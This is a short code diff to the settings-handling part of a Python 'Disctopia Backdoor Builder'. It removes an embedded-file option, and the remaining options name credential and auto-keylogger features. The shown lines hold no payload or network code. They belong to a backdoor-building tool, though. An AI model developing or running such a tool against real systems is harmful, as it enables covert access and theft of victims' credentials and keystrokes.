@@ -70,7 +70,7 @@ print('''
 
 Made by Dimitris Kalopisis | Twitter: @DKalopisis\n\n\n''')
 
-list =["None","None","None","None","None","None","None","None","None","None"]
+list =["None","None","None","None","None","None","None","None","None"]
 
 def getArgs():
     parser = argparse.ArgumentParser(description='Disctopia Backdoor Builder')
@@ -90,7 +90,6 @@ def createTable(list):
     table.add_row(["Agent-Online-ID", list[6]])
     table.add_row(["Credentials-ID", list[7]])
     table.add_row(["Auto-Keylogger", list[8]])
-    table.add_row(["Embeded File", list[9]])
 
     return table
 
@@ -106,7 +105,6 @@ def fetch(list):
         list[6] = data["settings"]["agent-online-id"]
         list[7] = data["settings"]["credentials-id"]
         list[8] = data["settings"]["auto-keylogger"]
-        list[9] = data["settings"]["embeded-file"]
 
     return list
 
